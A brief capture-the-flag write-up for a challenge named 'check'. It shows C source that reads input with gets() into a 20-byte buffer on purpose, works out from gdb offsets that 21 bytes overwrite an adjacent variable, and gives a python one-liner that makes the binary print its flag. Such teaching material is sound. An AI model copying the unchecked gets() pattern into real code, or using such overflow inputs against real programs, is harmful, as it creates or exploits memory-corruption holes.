# check

nc challenges.traboda.com 8033

* Given source code : 
```
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
void initialize(){
	alarm(30);
	setvbuf(stdin,NULL,2,0);
	setvbuf(stdout,NULL,2,0);
}
void check(int a){
	if(a){
		puts("I am strong enough.");
		puts("Thanks. You can take your flag");
		system("/bin/cat flag");
		exit(0);
}
	else{
		puts("You failed to do the job");
		exit(0);
}
}
int main(){
	initialize();
	int a=0;
	char buf[20];
	puts("Hey buddy !");
	puts("Feed me something so that I can grow strong and defeat Thanos.");
	gets(buf);
	check(a);
	return 0;
}
```
* Here we may simply have to overflow a which is stored into ebp-0xc as seen in gdb into a value other than 0.
* Similar to the overflow challenge, we can simply find the minimum bytes or length of inpur string required to change value at a.
* min No. of bytes required or min length of input strings should be  = 0x20 - 0xc = 20.
* So for a string of length 20, value at ebp-0xc wont change since it takes only 20 byts input. for overflow there needs to be an extra byte so that value at ebp-0xc changes from 0x00 to 0x41 (ascii of 'A')
* Hence required input length = 21

# Python code : 
```
python -c "print('A'*21)" | ./check.chall
```
